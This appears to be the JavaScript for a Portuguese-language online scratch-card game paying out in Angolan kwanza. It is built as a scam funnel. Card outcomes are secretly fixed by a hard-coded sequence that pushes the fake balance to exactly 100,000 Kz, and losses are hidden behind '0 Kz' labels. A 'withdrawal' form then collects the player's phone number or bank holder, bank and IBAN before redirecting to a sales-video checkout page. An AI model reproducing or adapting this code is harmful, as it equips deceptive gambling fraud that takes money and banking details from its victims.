// Stage 3: Game Logic (Scratch Card)
document.addEventListener('DOMContentLoaded', () => {
    const gameView = document.getElementById('game-view');
    const dashboardView = document.getElementById('dashboard-view');
    const backToDashBtn = document.getElementById('back-to-dash');
    const scratchGrid = document.getElementById('scratch-grid');
    const withdrawBtn = document.getElementById('withdraw-btn');
    const gameBackBtn = document.getElementById('game-back-btn');

    // Handle Withdraw Button
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', () => {
            if (window.userBalance < 100000) {
                alert("O saque será feito assim que atingires 100.000 Kz");
            } else {
                // If they reached 100k but closed the modal, allow reopen
                if (withdrawSuccessModal) withdrawSuccessModal.classList.remove('hidden');
            }
        });
    }

    // Variables will be initialized below...

    // Win Modal Elements
    const gameWinModal = document.getElementById('game-win-modal');
    const gameWinAmount = document.getElementById('game-win-amount');
    const collectBtn = document.getElementById('collect-btn');

    // Individual Reveal Elements
    const cardRevealModal = document.getElementById('card-reveal-modal');
    const revealCardAmount = document.getElementById('reveal-card-amount');
    const okRevealBtn = document.getElementById('ok-reveal-btn');

    let revealedCount = 0;
    let isGameActive = false;
    let currentWinningAmount = 0;
    let currentGameType = 'mini';
    let revealSequenceCounter = 0; // Persistent counter for WWL pattern
    let startBalanceOfGame = 3000;
    const fixedSequence = [15000, 15000, -2000, 20000, 20000, -2000, 18000, 18000, -2000]; // Target 100k net
    const withdrawSuccessModal = document.getElementById('withdraw-success-modal');
    const finalWithdrawBtn = document.getElementById('final-withdraw-btn');
    let hasTriggeredSuccess = false;

    const withdrawModal = document.getElementById('withdraw-modal');
    const expressFields = document.getElementById('express-fields');
    const transferFields = document.getElementById('transfer-fields');
    const submitWithdrawalBtn = document.getElementById('submit-withdrawal-btn');
    const withdrawModalBalance = document.getElementById('withdraw-modal-balance');

    // Handle Final Success Withdraw Button -> Go to Unified Modal
    if (finalWithdrawBtn) {
        finalWithdrawBtn.addEventListener('click', () => {
            if (withdrawSuccessModal) withdrawSuccessModal.classList.add('hidden');
            if (withdrawModal) {
                withdrawModal.classList.remove('hidden');
                if (withdrawModalBalance) {
                    withdrawModalBalance.innerText = window.userBalance.toLocaleString('pt-AO') + ' Kz';
                }
            }
        });
    }

    // Handle Dynamic Field Visibility
    const methodRadios = document.querySelectorAll('input[name="withdraw-method"]');
    methodRadios.forEach(radio => {
        radio.addEventListener('change', () => {
            if (radio.value === 'express') {
                if (expressFields) expressFields.classList.remove('hidden');
                if (transferFields) transferFields.classList.add('hidden');
            } else if (radio.value === 'transfer') {
                if (expressFields) expressFields.classList.add('hidden');
                if (transferFields) transferFields.classList.remove('hidden');
            }
        });
    });

    const withdrawLoadingModal = document.getElementById('withdraw-loading-modal');

    // Handle Final Submission
    if (submitWithdrawalBtn) {
        submitWithdrawalBtn.addEventListener('click', () => {
            const selected = document.querySelector('input[name="withdraw-method"]:checked');
            if (!selected) {
                alert("Por favor, selecione um método de saque.");
                return;
            }

            if (selected.value === 'express') {
                const phone = document.getElementById('express-phone').value;
                if (!phone) {
                    alert("Por favor, digite o seu número do Express.");
                    return;
                }
            } else {
                const holder = document.getElementById('bank-holder').value;
                const bank = document.getElementById('bank-name').value;
                const iban = document.getElementById('bank-iban').value;

                if (!holder || !bank || !iban) {
                    alert("Por favor, preencha todos os campos da transferência.");
                    return;
                }
            }

            // Show Loading Screen and then redirect after 3 seconds
            if (withdrawModal) withdrawModal.classList.add('hidden');
            if (withdrawLoadingModal) {
                withdrawLoadingModal.classList.remove('hidden');
            }

            // Redirect to Checkout View after 3 seconds
            setTimeout(() => {
                if (withdrawLoadingModal) withdrawLoadingModal.classList.add('hidden');

                // Hide all main containers
                const containers = ['login-view', 'dashboard-view', 'game-view'];
                containers.forEach(id => {
                    const el = document.getElementById(id);
                    if (el) {
                        el.classList.add('hidden');
                        el.style.display = 'none';
                    }
                });

                // Show checkout view
                const checkoutView = document.getElementById('checkout-view');
                if (checkoutView) {
                    checkoutView.classList.remove('hidden');
                    checkoutView.style.display = 'flex';
                    checkoutView.style.flexDirection = 'column';
                    checkoutView.style.alignItems = 'center';

                    // Load checkout video script
                    var s = document.createElement("script");
                    s.src = "https://scripts.converteai.net/77f7f12d-5e90-456d-b45e-7c7f2aa34ed0/players/698d0348ceb26906d0012546/v4/player.js";
                    s.async = true;
                    document.head.appendChild(s);

                    // Start the button timer
                    if (typeof window.showCheckoutButton === 'function') {
                        window.showCheckoutButton();
                    }
                }
            }, 3000);
        });
    }

    // Game Configuration
    const games = {
        'mini': { title: 'Mini Baza', maxPrize: '15.000 Kz', entry: 150, smallPrizes: [5000, 6000, 7000, 8000] },
        'media': { title: 'Baza Média', maxPrize: '30.000 Kz', entry: 400, smallPrizes: [9000, 10000, 12000, 15000] },
        'grande': { title: 'Grande Baza', maxPrize: '100.000 Kz', entry: 1000, smallPrizes: [18000, 20000, 25000, 30000] }
    };

    // Handle "Jogar Agora" buttons
    const playBtns = document.querySelectorAll('.play-btn');
    playBtns.forEach((btn, index) => {
        btn.addEventListener('click', () => {
            if (revealSequenceCounter >= 9) {
                alert("Você já atingiu o limite de jogadas! Saldo acumulado: " + window.userBalance.toLocaleString('pt-AO') + " Kz");
                return;
            }
            let gameType;
            if (index === 0) gameType = 'mini';
            else if (index === 1) gameType = 'media';
            else if (index === 2) gameType = 'grande';

            initGame(gameType);
        });
    });

    if (backToDashBtn) {
        backToDashBtn.addEventListener('click', () => {
            if (gameView) {
                gameView.classList.add('hidden');
                gameView.style.display = 'none';
            }
            if (dashboardView) {
                dashboardView.classList.remove('hidden');
                dashboardView.style.display = 'block';
            }
            if (gameWinModal) gameWinModal.classList.add('hidden');
        });
    }

    if (gameBackBtn) {
        gameBackBtn.addEventListener('click', () => {
            backToDashBtn.click();
        });
    }

    if (collectBtn) {
        collectBtn.addEventListener('click', () => {
            gameWinModal.classList.add('hidden');
            backToDashBtn.click();
        });
    }

    if (okRevealBtn) {
        okRevealBtn.addEventListener('click', () => {
            cardRevealModal.classList.add('hidden');
            initGame(currentGameType);
        });
    }

    function initGame(type) {
        currentGameType = type;
        isGameActive = true;
        revealedCount = 0;
        hasTriggeredSuccess = false;

        const config = games[type];

        // Deduct entry fee
        if (window.userBalance >= config.entry) {
            window.userBalance -= config.entry;
            if (typeof window.updateBalanceDisplay === 'function') {
                window.updateBalanceDisplay();
            }
        } else {
            alert("Saldo insuficiente!");
            return;
        }

        if (dashboardView) {
            dashboardView.classList.add('hidden');
            dashboardView.style.display = 'none';
        }

        if (gameView) {
            gameView.classList.remove('hidden');
            gameView.style.display = 'flex';
            gameView.style.flexDirection = 'column';
        }

        const gameTitleElem = document.getElementById('game-title');
        if (gameTitleElem) gameTitleElem.innerText = config.title;

        if (withdrawBtn) withdrawBtn.classList.remove('hidden');
        if (gameBackBtn) gameBackBtn.classList.add('hidden');
        checkWithdrawalLimit();

        // Store balance at start of game for total win calculation
        startBalanceOfGame = window.userBalance;

        // Reset game winnings accumulator for the modal
        if (revealSequenceCounter >= 9) {
            currentWinningAmount = config.smallPrizes[Math.floor(Math.random() * config.smallPrizes.length)];
        }

        // Generate Cards
        if (scratchGrid) {
            scratchGrid.innerHTML = '';
            const values = generateCardValues(config);

            values.forEach((val) => {
                const cardWrapper = document.createElement('div');
                cardWrapper.className = 'scratch-card';
                cardWrapper.style.position = 'relative';

                const content = document.createElement('div');
                content.className = 'scratch-card-content';
                content.dataset.type = val.type; // Store type
                content.innerHTML = `
                    <div class="card-icon">${val.icon}</div>
                    <div class="card-value">${val.amount}</div>
                `;
                cardWrapper.appendChild(content);

                const canvas = document.createElement('canvas');
                canvas.className = 'scratch-canvas';
                canvas.width = 100;
                canvas.height = 100;
                canvas.style.position = 'absolute';
                canvas.style.top = '0';
                canvas.style.left = '0';
                canvas.style.width = '100%';
                canvas.style.height = '100%';
                canvas.style.zIndex = '2';
                canvas.style.cursor = 'crosshair';

                cardWrapper.appendChild(canvas);
                scratchGrid.appendChild(cardWrapper);

                initScratchCanvas(canvas, cardWrapper);
            });
        }

        // IMMEDIATE SUCCESS CHECK (if already >= 100k)
        if (window.userBalance >= 100000 && !hasTriggeredSuccess) {
            hasTriggeredSuccess = true;
            isGameActive = false;
            setTimeout(() => {
                if (withdrawSuccessModal) withdrawSuccessModal.classList.remove('hidden');
                const audio = document.getElementById('welcome-audio');
                if (audio) {
                    audio.currentTime = 0;
                    audio.play().catch(e => console.log("Audio play failed:", e));
                }
            }, 500);
        }
    }

    function initScratchCanvas(canvas, cardWrapper) {
        const ctx = canvas.getContext('2d');
        const width = canvas.width;
        const height = canvas.height;

        ctx.fillStyle = '#ff9800';
        ctx.fillRect(0, 0, width, height);

        ctx.fillStyle = '#f57c00';
        for (let i = 0; i < 100; i++) {
            const x = Math.random() * width;
            const y = Math.random() * height;
            const r = Math.random() * 2 + 1;
            ctx.beginPath();
            ctx.arc(x, y, r, 0, Math.PI * 2);
            ctx.fill();
        }

        let isDrawing = false;

        function getMousePos(e) {
            const rect = canvas.getBoundingClientRect();
            const scaleX = canvas.width / rect.width;
            const scaleY = canvas.height / rect.height;

            let clientX, clientY;
            if (e.touches && e.touches.length > 0) {
                clientX = e.touches[0].clientX;
                clientY = e.touches[0].clientY;
            } else {
                clientX = e.clientX;
                clientY = e.clientY;
            }

            return {
                x: (clientX - rect.left) * scaleX,
                y: (clientY - rect.top) * scaleY
            };
        }

        function scratch(e) {
            if (!isDrawing) return;
            e.preventDefault();

            const pos = getMousePos(e);
            ctx.globalCompositeOperation = 'destination-out';
            ctx.beginPath();
            ctx.arc(pos.x, pos.y, 12, 0, Math.PI * 2);
            ctx.fill();

            checkScratchPercent(canvas, cardWrapper);
        }

        canvas.addEventListener('mousedown', (e) => { isDrawing = true; scratch(e); });
        canvas.addEventListener('mousemove', scratch);
        canvas.addEventListener('mouseup', () => { isDrawing = false; });
        canvas.addEventListener('mouseleave', () => { isDrawing = false; });

        canvas.addEventListener('touchstart', (e) => { isDrawing = true; scratch(e); });
        canvas.addEventListener('touchmove', scratch);
        canvas.addEventListener('touchend', () => { isDrawing = false; });
    }

    function checkScratchPercent(canvas, cardWrapper) {
        if (cardWrapper.classList.contains('revealed')) return;

        const ctx = canvas.getContext('2d');
        const width = canvas.width;
        const height = canvas.height;
        const imageData = ctx.getImageData(0, 0, width, height);
        const pixels = imageData.data;
        let transparentConfig = 0;
        const totalPixels = width * height;

        for (let i = 3; i < pixels.length; i += 4) {
            if (pixels[i] < 128) {
                transparentConfig++;
            }
        }

        const percent = (transparentConfig / totalPixels) * 100;

        if (percent > 40) {
            cardWrapper.classList.add('revealed');
            revealCard(cardWrapper); // Trigger balance update and sequence check
            canvas.style.opacity = '0';
            canvas.style.transition = 'opacity 0.5s';
            setTimeout(() => {
                if (canvas.parentNode) canvas.remove();
            }, 500);
        }
    }

    function generateCardValues(config) {
        let values = [];
        // 1 Max Prize
        values.push({ amount: config.maxPrize, icon: '💎', type: 'win' });

        // 3 Matching Small Prizes (Winning Set)
        currentWinningAmount = config.smallPrizes[Math.floor(Math.random() * config.smallPrizes.length)];
        const formattedWinning = currentWinningAmount.toLocaleString('pt-AO') + ' Kz';
        for (let i = 0; i < 3; i++) {
            values.push({ amount: formattedWinning, icon: '🍀', type: 'win' });
        }

        // 2 Loss Cards (Empty)
        for (let i = 0; i < 2; i++) {
            values.push({ amount: '0 Kz', icon: '❌', type: 'loss' });
        }

        // 3 Random Fillers
        for (let i = 0; i < 3; i++) {
            const randomAmt = config.smallPrizes[Math.floor(Math.random() * config.smallPrizes.length)];
            values.push({ amount: randomAmt.toLocaleString('pt-AO') + ' Kz', icon: '💰', type: 'win' });
        }

        return values.sort(() => Math.random() - 0.5);
    }

    function checkWithdrawalLimit() {
        if (!withdrawBtn) return;

        // Button is always clickable for the warning alert, 
        // but it changes color at 100k for visual indication
        if (window.userBalance >= 100000) {
            withdrawBtn.classList.remove('disabled');
            withdrawBtn.style.backgroundColor = '#9C27B0'; // Active purple
            withdrawBtn.style.cursor = 'pointer';
        } else {
            withdrawBtn.classList.add('disabled');
            withdrawBtn.style.backgroundColor = '#555';
            withdrawBtn.style.cursor = 'pointer'; // Keep pointer so they know they can click for the info
        }
    }

    function revealCard(card) {
        if (card.dataset.revealed === 'true') return;
        card.dataset.revealed = 'true';

        card.classList.add('revealed');
        revealedCount++;

        // Forced WWL + 100k Precision Goal Logic
        let type, amountValue;
        const targetFinalBalance = 100000;

        if (revealSequenceCounter === 8) {
            // The 9th card: Force balance to exactly targetFinalBalance
            amountValue = targetFinalBalance - window.userBalance;
            type = 'loss'; // Always a loss on the 9th according to WWL pattern
        } else if (revealSequenceCounter < 8) {
            amountValue = fixedSequence[revealSequenceCounter];
            type = (amountValue < 0) ? 'loss' : 'win';
        } else {
            // Already past 9, just a fallback
            type = 'loss';
            amountValue = 0;
        }

        revealSequenceCounter++;

        const content = card.querySelector('.scratch-card-content');
        const amountTextEl = card.querySelector('.card-value');

        let amountText = "";
        const prevBalance = window.userBalance;

        if (type === 'loss') {
            amountText = "0 Kz";
            amountTextEl.innerText = amountText;
            content.dataset.type = 'loss';
            content.querySelector('.card-icon').innerText = '❌';

            window.userBalance += amountValue;
        } else {
            amountText = amountValue.toLocaleString('pt-AO') + ' Kz';
            amountTextEl.innerText = amountText;
            content.dataset.type = 'win';
            content.querySelector('.card-icon').innerText = '💰';

            window.userBalance += amountValue;
        }

        if (typeof window.animateBalanceUpdate === 'function') {
            window.animateBalanceUpdate(prevBalance, window.userBalance);
        } else if (typeof window.updateBalanceDisplay === 'function') {
            window.updateBalanceDisplay();
        }
        checkWithdrawalLimit();

        // AUTO TRIGGER SUCCESS POPUP AT 100k
        if (window.userBalance >= 100000 && !hasTriggeredSuccess) {
            hasTriggeredSuccess = true;
            isGameActive = false; // Stop further interaction
            setTimeout(() => {
                if (withdrawSuccessModal) withdrawSuccessModal.classList.remove('hidden');
                const audio = document.getElementById('welcome-audio');
                if (audio) {
                    audio.currentTime = 0;
                    audio.play().catch(e => console.log("Audio play failed:", e));
                }
            }, 800);
            return; // Exit function so individual reveal modal doesn't show
        }

        if (revealedCount >= 9) {
            endGame();
        } else {
            setTimeout(() => {
                const revealTitle = document.getElementById('reveal-title');
                const okBtn = document.getElementById('ok-reveal-btn');

                if (type === 'loss') {
                    if (revealTitle) revealTitle.innerText = "AQUI NÃO TEM NADA!";
                    if (revealCardAmount) {
                        const displayLoss = Math.abs(amountValue);
                        revealCardAmount.innerText = "VOCÊ PERDEU " + displayLoss.toLocaleString('pt-AO') + " KZ";
                        revealCardAmount.style.color = "#FF5252";
                        revealCardAmount.style.fontSize = "1.8rem";
                    }
                    if (okBtn) okBtn.style.backgroundColor = "#FF5252";
                } else {
                    if (revealTitle) revealTitle.innerText = "VOCÊ GANHOU!";
                    if (revealCardAmount) {
                        revealCardAmount.innerText = amountText;
                        revealCardAmount.style.color = "#00E676";
                        revealCardAmount.style.fontSize = "2.5rem"; // Reset font size
                    }
                    if (okBtn) okBtn.style.backgroundColor = "#00E676";
                }

                if (cardRevealModal) cardRevealModal.classList.remove('hidden');

                // Play Victory Sound for individual reveal
                const audio = document.getElementById('victory-audio');
                if (audio) {
                    audio.currentTime = 0;
                    audio.play().catch(e => console.log("Audio play failed:", e));
                }
            }, 500);
        }
    }

    // General Game Events
    if (backToDashBtn) {
        backToDashBtn.addEventListener('click', () => {
            if (gameView) {
                gameView.classList.add('hidden');
                gameView.style.display = 'none';
            }
            if (dashboardView) {
                dashboardView.classList.remove('hidden');
                dashboardView.style.display = 'flex';
                dashboardView.style.flexDirection = 'column';
            }
        });
    }

    function endGame() {
        if (withdrawBtn) withdrawBtn.classList.add('hidden');
        if (gameBackBtn) gameBackBtn.classList.remove('hidden');

        // Calculate total winnings of THIS game for the final modal
        currentWinningAmount = window.userBalance - startBalanceOfGame;
        if (currentWinningAmount < 0) currentWinningAmount = 0;

        // Note: Balance is now added incrementally in revealCard()

        // Show Standard Win Modal (only if not 100k success)
        setTimeout(() => {
            if (gameWinModal) gameWinModal.classList.remove('hidden');
        }, 500);

        const audio = document.getElementById('victory-audio');
        if (audio) {
            audio.currentTime = 0;
            audio.play().catch(e => console.log("Audio play failed:", e));
        }

        if (gameWinAmount) animateValue(gameWinAmount, 0, currentWinningAmount, 1500);
    }

    function animateValue(element, start, end, duration) {
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const value = Math.floor(progress * (end - start) + start);
            element.innerText = value.toLocaleString('pt-AO') + ' Kz';
            if (progress < 1) {
                window.requestAnimationFrame(step);
            } else {
                element.innerText = end.toLocaleString('pt-AO') + ' Kz';
            }
        };
        window.requestAnimationFrame(step);
    }
});
